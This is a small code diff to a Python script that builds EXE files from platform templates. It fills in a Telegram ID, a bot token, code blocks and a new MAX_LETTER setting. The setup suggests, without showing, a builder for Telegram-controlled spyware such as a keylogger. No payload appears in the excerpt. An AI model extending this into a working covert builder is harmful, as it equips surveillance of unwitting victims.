@@ -16,7 +16,7 @@ def printer(per="0"): # it print same banner each time and print the percent of 
     print(Fore.GREEN + f"Creating EXE file({per}%).")
     # wait for 1 second
     sleep(1)
-def make_python(ID, TOKEN, NAME, CODE_ADDR, OFFLINE_CODE_ADDR, PLATFORM): # create the python file
+def make_python(ID, TOKEN, NAME, MAX_LETTER, CODE_ADDR, OFFLINE_CODE_ADDR, PLATFORM): # create the python file
     # read platform code(builder/windows-build.py or linux-build.py)
     with open(PLATFORM, "r") as read: 
         text = read.readlines()
@@ -38,7 +38,7 @@ def make_python(ID, TOKEN, NAME, CODE_ADDR, OFFLINE_CODE_ADDR, PLATFORM): # crea
             # read each line of code
             for line in reader:
                 offline_code += f"    {line}\n"
-        text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("ONLINE_CODE", online_code).replace("OFFLINE_CODE", offline_code)
+        text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("ONLINE_CODE", online_code).replace("OFFLINE_CODE", offline_code).replace("MAX_LETTER", MAX_LETTER)
     # make 'output' directory
     getoutput("mkdir output")
     # make output file with custom name
